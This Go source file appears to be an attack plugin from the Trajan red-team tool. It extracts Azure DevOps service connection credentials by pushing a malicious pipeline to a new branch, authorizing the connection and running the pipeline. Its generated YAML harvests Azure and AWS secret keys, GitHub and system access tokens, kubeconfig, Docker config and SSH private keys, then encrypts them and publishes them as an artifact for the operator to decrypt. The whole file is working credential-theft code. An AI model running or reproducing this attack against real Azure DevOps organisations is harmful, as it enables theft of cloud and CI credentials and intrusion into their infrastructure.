package extractconnections

import (
	"context"
	"encoding/json"
	"fmt"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/audit"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/azuredevops"
	"github.com/praetorian-inc/trajan/pkg/azuredevops/attacks/common"
	"github.com/praetorian-inc/trajan/pkg/crypto"
	"github.com/praetorian-inc/trajan/pkg/detections"
)

func init() {
	registry.RegisterAttackPlugin("azuredevops", "ado-extract-connections", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements service connection credential extraction via pipeline execution
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new extract connections attack plugin
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"ado-extract-connections",
			"Extract credentials from service connections via malicious pipeline",
			"azuredevops",
			attacks.CategorySecrets,
		),
	}
}

// CanAttack checks if extract connections attack is applicable
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	return common.FindingHasType(findings, detections.VulnOverexposedServiceConnections) ||
		common.FindingHasType(findings, detections.VulnServiceConnectionHijacking)
}

// Execute performs the extract connections attack
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	audit.LogAttackStart(opts.SessionID, p.Name(), opts.Target, opts.DryRun)

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Get ADO client
	client, err := common.GetADOClient(opts.Platform)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	result, err = p.executeWithClient(ctx, client, opts)
	audit.LogAttackEnd(opts.SessionID, p.Name(), opts.Target, result)
	return result, err
}

// executeWithClient performs the attack with an injected client (for testing)
func (p *Plugin) executeWithClient(ctx context.Context, client *azuredevops.Client, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	// Parse project/repo from target value
	project, repo, err := common.ParseProjectRepo(opts.Target.Value)
	if err != nil {
		result.Success = false
		result.Message = err.Error()
		return result, err
	}

	// Get connection type and name from ExtraOpts
	if opts.ExtraOpts == nil {
		result.Success = false
		result.Message = "missing connection type and name in ExtraOpts"
		return result, fmt.Errorf("missing ExtraOpts")
	}

	connType, ok := opts.ExtraOpts["type"]
	if !ok || connType == "" {
		result.Success = false
		result.Message = "missing 'type' in ExtraOpts (azure, github, aws, kubernetes, docker, ssh, sonarqube, generic)"
		return result, fmt.Errorf("missing connection type")
	}

	connName, ok := opts.ExtraOpts["connection"]
	if !ok || connName == "" {
		result.Success = false
		result.Message = "missing 'connection' in ExtraOpts (service connection name)"
		return result, fmt.Errorf("missing connection name")
	}

	branchName := fmt.Sprintf("trajan-extract-conn-%s", opts.SessionID)
	pipelinePath := fmt.Sprintf("azure-pipelines-extract-%s.yml", connType)

	// Generate RSA keypair for hybrid encryption
	keyPair, err := crypto.GenerateKeyPair()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to generate RSA keypair: %v", err)
		return result, err
	}

	publicKeyPEM, err := keyPair.PublicKeyPEM()
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to encode public key: %v", err)
		return result, err
	}

	// Generate pipeline YAML based on connection type
	pipelineYAML := p.generateExtractionYAML(connType, connName, publicKeyPEM, opts.ExtraOpts)
	if pipelineYAML == "" {
		result.Success = false
		result.Message = fmt.Sprintf("unsupported connection type: %s", connType)
		return result, fmt.Errorf("unsupported connection type")
	}

	if opts.DryRun {
		result.Success = true
		result.Message = fmt.Sprintf("[DRY RUN] Would extract credentials from %s service connection '%s' in %s/%s",
			connType, connName, project, repo)
		result.Artifacts = []attacks.Artifact{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Description: "Attack branch",
			},
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  pipelinePath,
				Description: fmt.Sprintf("Extraction pipeline for %s connection", connType),
			},
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		return result, nil
	}

	// List service connections and find the target
	connections, err := client.ListServiceConnections(ctx, project)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list service connections: %v", err)
		return result, err
	}

	var targetConn *azuredevops.ServiceConnection
	for i := range connections {
		if connections[i].Name == connName {
			targetConn = &connections[i]
			break
		}
	}

	if targetConn == nil {
		result.Success = false
		result.Message = fmt.Sprintf("service connection '%s' not found in project %s", connName, project)
		return result, fmt.Errorf("service connection not found: %s", connName)
	}

	// Get repository default branch
	repository, err := client.GetRepository(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to get repository: %v", err)
		return result, err
	}

	defaultBranch := repository.DefaultBranch
	if defaultBranch == "" {
		defaultBranch = "refs/heads/main"
	}
	defaultBranch = strings.TrimPrefix(defaultBranch, "refs/heads/")

	// Get commit ID for default branch
	branches, err := client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var commitID string
	refName := "refs/heads/" + defaultBranch
	for _, branch := range branches {
		if branch.Name == refName {
			commitID = branch.ObjectID
			break
		}
	}

	if commitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find default branch: %s", defaultBranch)
		return result, fmt.Errorf("branch not found: %s", defaultBranch)
	}

	// Create attack branch
	err = client.CreateBranch(ctx, project, repo, branchName, commitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create branch: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactBranch,
		Identifier:  branchName,
		Description: "Attack branch created",
	})

	branches, err = client.ListGitBranches(ctx, project, repo)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to list branches: %v", err)
		return result, err
	}

	var newBranchCommitID string
	newRefName := "refs/heads/" + branchName
	for _, branch := range branches {
		if branch.Name == newRefName {
			newBranchCommitID = branch.ObjectID
			break
		}
	}

	if newBranchCommitID == "" {
		result.Success = false
		result.Message = fmt.Sprintf("failed to find new branch: %s", branchName)
		return result, fmt.Errorf("branch not found: %s", branchName)
	}

	// Push malicious pipeline YAML to branch
	commitMsg := fmt.Sprintf("Add %s connection extraction pipeline", connType)
	err = client.PushFile(ctx, project, repo, branchName, pipelinePath, pipelineYAML, commitMsg, newBranchCommitID)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to push pipeline file: %v", err)
		return result, err
	}

	result.Artifacts = append(result.Artifacts, attacks.Artifact{
		Type:        attacks.ArtifactWorkflow,
		Identifier:  pipelinePath,
		Description: fmt.Sprintf("%s connection extraction pipeline pushed", connType),
	})

	// Create pipeline definition pointing to the malicious YAML
	pipelineReq := azuredevops.CreatePipelineRequest{
		Name:   fmt.Sprintf("trajan-extract-conn-%s", opts.SessionID),
		Folder: "\\",
	}
	pipelineReq.Configuration.Type = "yaml"
	pipelineReq.Configuration.Path = "/" + pipelinePath
	pipelineReq.Configuration.Repository.ID = repository.ID
	pipelineReq.Configuration.Repository.Type = "azureReposGit"

	pipeline, err := client.CreatePipeline(ctx, project, pipelineReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to create pipeline: %v", err)
		return result, err
	}

	// Authorize the service endpoint for the pipeline
	if err := client.AuthorizePipelineResourceStr(ctx, project, "endpoint", targetConn.ID, pipeline.ID); err != nil {
		// Non-fatal: log and continue
		fmt.Printf("Warning: failed to authorize service endpoint: %v\n", err)
	}

	// Run the pipeline on the attack branch
	runReq := azuredevops.RunPipelineRequest{}
	runReq.Resources.Repositories = map[string]struct {
		RefName string `json:"refName"`
	}{
		"self": {RefName: "refs/heads/" + branchName},
	}

	run, err := client.RunPipeline(ctx, project, pipeline.ID, runReq)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to run pipeline: %v", err)
		return result, err
	}

	// Poll for build completion
	var finalRun *azuredevops.PipelineRun
	for i := 0; i < 60; i++ {
		time.Sleep(5 * time.Second)

		pipelineRun, err := client.GetPipelineRun(ctx, project, pipeline.ID, run.ID)
		if err != nil {
			continue
		}

		if pipelineRun.State == "completed" {
			finalRun = pipelineRun
			break
		}
	}

	if finalRun == nil {
		result.Success = false
		result.Message = "pipeline run did not complete within timeout"
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
				Action:      "delete",
				Description: "Delete pipeline definition",
			},
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		return result, fmt.Errorf("pipeline run timed out")
	}

	// Retrieve and decrypt credentials from pipeline artifact
	privateKeyPEM := keyPair.PrivateKeyPEM()
	decrypted, err := common.RetrieveAndDecryptSecrets(ctx, client, project, pipeline.ID, run.ID, "encrypted-secrets", privateKeyPEM)
	if err != nil {
		// Store private key so the user can retry with 'trajan ado retrieve'
		result.Success = true
		result.Message = fmt.Sprintf("Pipeline completed but retrieval failed: %v. Use 'trajan ado retrieve --pipeline-id %d --run-id %d' to retry.", err, pipeline.ID, run.ID)
		result.Data = map[string]interface{}{
			"branch":          branchName,
			"pipeline_path":   pipelinePath,
			"pipeline_id":     pipeline.ID,
			"run_id":          run.ID,
			"connection_type": connType,
			"connection_name": connName,
			"connection_id":   targetConn.ID,
			"project":         project,
			"repo":            repo,
			"private_key_pem": privateKeyPEM,
		}
		result.CleanupActions = []attacks.CleanupAction{
			{
				Type:        attacks.ArtifactWorkflow,
				Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
				Action:      "delete",
				Description: "Delete pipeline definition",
			},
			{
				Type:        attacks.ArtifactBranch,
				Identifier:  branchName,
				Action:      "delete",
				Description: "Delete attack branch",
			},
		}
		return result, nil
	}

	// Parse decrypted JSON into key-value pairs
	var secretsMap map[string]string
	if err := json.Unmarshal(decrypted, &secretsMap); err != nil {
		secretsMap = map[string]string{"raw_output": string(decrypted)}
	}

	// Build sorted secrets list, filtering empty values
	var secrets []string
	keys := make([]string, 0, len(secretsMap))
	for k := range secretsMap {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	for _, k := range keys {
		if secretsMap[k] != "" {
			secrets = append(secrets, fmt.Sprintf("%s=%s", k, secretsMap[k]))
		}
	}

	if len(secrets) > 0 {
		result.Success = true
		result.Message = fmt.Sprintf("Extracted %d credentials from %s service connection '%s'",
			len(secrets), connType, connName)
	} else if finalRun.Result != "succeeded" {
		result.Success = false
		result.Message = fmt.Sprintf("Pipeline completed with result '%s'. No credentials extracted from %s connection '%s'.",
			finalRun.Result, connType, connName)
	} else {
		result.Success = true
		result.Message = fmt.Sprintf("Pipeline succeeded but no credentials found. Connection: %s '%s'",
			connType, connName)
	}
	result.Data = map[string]interface{}{
		"branch":          branchName,
		"pipeline_path":   pipelinePath,
		"pipeline_id":     pipeline.ID,
		"run_id":          run.ID,
		"connection_type": connType,
		"connection_name": connName,
		"connection_id":   targetConn.ID,
		"project":         project,
		"repo":            repo,
		"secrets":         secrets,
		"private_key_pem": privateKeyPEM,
	}

	result.CleanupActions = []attacks.CleanupAction{
		{
			Type:        attacks.ArtifactWorkflow,
			Identifier:  fmt.Sprintf("pipeline:%d", pipeline.ID),
			Action:      "delete",
			Description: "Delete pipeline definition",
		},
		{
			Type:        attacks.ArtifactBranch,
			Identifier:  branchName,
			Action:      "delete",
			Description: "Delete attack branch",
		},
	}

	return result, nil
}

// generateExtractionYAML generates pipeline YAML for extracting credentials from different connection types.
// Each template collects credentials into output.json, encrypts with RSA+AES hybrid encryption,
// and publishes as a pipeline artifact.
func (p *Plugin) generateExtractionYAML(connType, connName, publicKeyPEM string, extraOpts map[string]string) string {
	suffix := encryptionSuffix(publicKeyPEM)

	switch connType {
	case "azure":
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: AzureCLI@2
    inputs:
      azureSubscription: '%s'
      scriptType: 'bash'
      scriptLocation: 'inlineScript'
      inlineScript: |
        python3 -c "
        import os, json
        result = {
            'ARM_CLIENT_ID': os.environ.get('ARM_CLIENT_ID', ''),
            'ARM_CLIENT_SECRET': os.environ.get('ARM_CLIENT_SECRET', ''),
            'ARM_TENANT_ID': os.environ.get('ARM_TENANT_ID', ''),
            'ARM_SUBSCRIPTION_ID': os.environ.get('ARM_SUBSCRIPTION_ID', ''),
        }
        with open('output.json', 'w') as f:
            json.dump(result, f)
        "
    displayName: 'Collect Azure Credentials'
%s`, connName, suffix)

	case "github":
		githubRepo := "octocat/Hello-World"
		if extraOpts != nil {
			if repo, ok := extraOpts["github_repo"]; ok && repo != "" {
				githubRepo = repo
			}
		}
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

resources:
  repositories:
    - repository: github_target
      type: github
      endpoint: '%s'
      name: '%s'

steps:
  - checkout: github_target
    persistCredentials: true
  - script: |
      python3 -c "
      import os, json, subprocess
      git_config = subprocess.run(['cat', '.git/config'], capture_output=True, text=True).stdout
      result = {
          'git_config': git_config,
          'SYSTEM_ACCESSTOKEN': os.environ.get('SYSTEM_ACCESSTOKEN', ''),
      }
      with open('output.json', 'w') as f:
          json.dump(result, f)
      "
    displayName: 'Collect GitHub Connection'
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
%s`, connName, githubRepo, suffix)

	case "aws":
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: AWSShellScript@1
    inputs:
      awsCredentials: '%s'
      regionName: 'us-east-1'
      scriptType: 'inline'
      inlineScript: |
        python3 -c "
        import os, json
        result = {
            'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID', ''),
            'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY', ''),
            'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN', ''),
        }
        with open('output.json', 'w') as f:
            json.dump(result, f)
        "
    displayName: 'Collect AWS Credentials'
%s`, connName, suffix)

	case "kubernetes":
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: Kubernetes@1
    inputs:
      kubernetesServiceConnection: '%s'
      command: 'get'
      arguments: 'pods'
  - script: |
      python3 -c "
      import os, json
      kubeconfig_path = os.environ.get('KUBECONFIG', '')
      kubeconfig_content = ''
      if kubeconfig_path and os.path.exists(kubeconfig_path):
          with open(kubeconfig_path) as f:
              kubeconfig_content = f.read()
      result = {'KUBECONFIG': kubeconfig_content}
      with open('output.json', 'w') as f:
          json.dump(result, f)
      "
    displayName: 'Collect Kubeconfig'
%s`, connName, suffix)

	case "docker":
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: Docker@2
    inputs:
      containerRegistry: '%s'
      command: 'login'
  - script: |
      python3 -c "
      import os, json
      docker_config = ''
      config_path = os.path.expanduser('~/.docker/config.json')
      if os.path.exists(config_path):
          with open(config_path) as f:
              docker_config = f.read()
      result = {'docker_config': docker_config}
      with open('output.json', 'w') as f:
          json.dump(result, f)
      "
    displayName: 'Collect Docker Config'
%s`, connName, suffix)

	case "ssh":
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: SSH@0
    inputs:
      sshEndpoint: '%s'
      runOptions: 'commands'
      commands: 'echo "test"'
  - script: |
      python3 -c "
      import os, json
      ssh_key = ''
      key_path = os.path.expanduser('~/.ssh/id_rsa')
      if os.path.exists(key_path):
          with open(key_path) as f:
              ssh_key = f.read()
      result = {'ssh_private_key': ssh_key}
      with open('output.json', 'w') as f:
          json.dump(result, f)
      "
    displayName: 'Collect SSH Key'
%s`, connName, suffix)

	case "sonarqube":
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - task: SonarQubePrepare@5
    inputs:
      SonarQube: '%s'
      scannerMode: 'CLI'
      configMode: 'manual'
      cliProjectKey: 'test'
      cliProjectName: 'test'
  - script: |
      python3 -c "
      import os, json
      result = {'SONAR_TOKEN': os.environ.get('SONAR_TOKEN', '')}
      with open('output.json', 'w') as f:
          json.dump(result, f)
      "
    displayName: 'Collect SonarQube Token'
%s`, connName, suffix)

	case "generic":
		return fmt.Sprintf(`trigger: none

pool:
  vmImage: 'ubuntu-latest'

steps:
  - script: |
      python3 -c "
      import os, json, base64, urllib.request
      org_url = os.environ.get('SYSTEM_COLLECTIONURI', '')
      project = os.environ.get('SYSTEM_TEAMPROJECT', '')
      token = os.environ.get('SYSTEM_ACCESSTOKEN', '')
      url = f'{org_url}{project}/_apis/serviceendpoint/endpoints?endpointNames=%s&api-version=7.1'
      req = urllib.request.Request(url)
      creds = base64.b64encode(f':{token}'.encode()).decode()
      req.add_header('Authorization', f'Basic {creds}')
      try:
          resp = urllib.request.urlopen(req)
          api_response = resp.read().decode()
      except Exception as e:
          api_response = str(e)
      result = {
          'api_response': api_response,
          'SYSTEM_ACCESSTOKEN': token,
      }
      with open('output.json', 'w') as f:
          json.dump(result, f)
      "
    displayName: 'Collect Generic Connection Credentials'
    env:
      SYSTEM_ACCESSTOKEN: $(System.AccessToken)
%s`, connName, suffix)

	default:
		return ""
	}
}

// encryptionSuffix returns the YAML steps for encrypting output.json and publishing as a pipeline artifact.
func encryptionSuffix(publicKeyPEM string) string {
	var sb strings.Builder
	sb.WriteString("  - script: |\n")
	sb.WriteString("      aes_key=$(openssl rand -hex 32 | tr -d '\\n')\n")
	sb.WriteString("      openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key\n")
	sb.WriteString("      echo \"$PUBKEY\" > /tmp/pubkey.pem\n")
	sb.WriteString("      echo -n $aes_key | openssl pkeyutl -encrypt -pubin -inkey /tmp/pubkey.pem -pkeyopt rsa_padding_mode:pkcs1 -out lookup.txt 2>/dev/null\n")
	sb.WriteString("      rm -f /tmp/pubkey.pem output.json\n")
	sb.WriteString("      mkdir -p $(Build.ArtifactStagingDirectory)/encrypted\n")
	sb.WriteString("      mv output_updated.json lookup.txt $(Build.ArtifactStagingDirectory)/encrypted/\n")
	sb.WriteString("    displayName: 'Encrypt Extracted Credentials'\n")
	sb.WriteString("    env:\n")
	sb.WriteString("      PUBKEY: |\n")
	for _, line := range strings.Split(strings.TrimSpace(publicKeyPEM), "\n") {
		fmt.Fprintf(&sb, "        %s\n", line)
	}
	sb.WriteString("  - task: PublishPipelineArtifact@1\n")
	sb.WriteString("    inputs:\n")
	sb.WriteString("      targetPath: '$(Build.ArtifactStagingDirectory)/encrypted'\n")
	sb.WriteString("      artifact: 'encrypted-secrets'\n")
	sb.WriteString("      publishLocation: 'pipeline'\n")
	sb.WriteString("    displayName: 'Upload Encrypted Artifacts'\n")
	return sb.String()
}

// Cleanup removes artifacts created by the attack
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	client, err := common.GetADOClient(session.Platform)
	if err != nil {
		return err
	}

	return p.cleanupWithClient(ctx, client, session)
}

// cleanupWithClient removes artifacts with an injected client (for testing)
func (p *Plugin) cleanupWithClient(ctx context.Context, client *azuredevops.Client, session *attacks.Session) error {
	project, repo, err := common.ParseProjectRepo(session.Target.Value)
	if err != nil {
		return err
	}

	for _, result := range session.Results {
		if result.Plugin != p.Name() {
			continue
		}

		for _, action := range result.CleanupActions {
			switch action.Type {
			case attacks.ArtifactWorkflow:
				// Parse pipeline ID from identifier "pipeline:ID"
				idStr := strings.TrimPrefix(action.Identifier, "pipeline:")
				pipelineID, err := strconv.Atoi(idStr)
				if err != nil {
					fmt.Printf("Failed to parse pipeline ID from %s: %v\n", action.Identifier, err)
					continue
				}

				if err := client.DeletePipeline(ctx, project, pipelineID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Pipeline %d already deleted or doesn't exist\n", pipelineID)
						continue
					}
					return fmt.Errorf("deleting pipeline %d: %w", pipelineID, err)
				}

			case attacks.ArtifactBranch:
				// Get branch commit ID for deletion
				branches, err := client.ListGitBranches(ctx, project, repo)
				if err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("listing branches for deletion: %w", err)
				}

				var commitID string
				refName := "refs/heads/" + action.Identifier
				for _, branch := range branches {
					if branch.Name == refName {
						commitID = branch.ObjectID
						break
					}
				}

				if commitID == "" {
					fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
					continue
				}

				if err := client.DeleteBranch(ctx, project, repo, action.Identifier, commitID); err != nil {
					if strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "Not Found") {
						fmt.Printf("Branch %s already deleted or doesn't exist\n", action.Identifier)
						continue
					}
					return fmt.Errorf("deleting branch %s: %w", action.Identifier, err)
				}
			}
		}
	}

	return nil
}
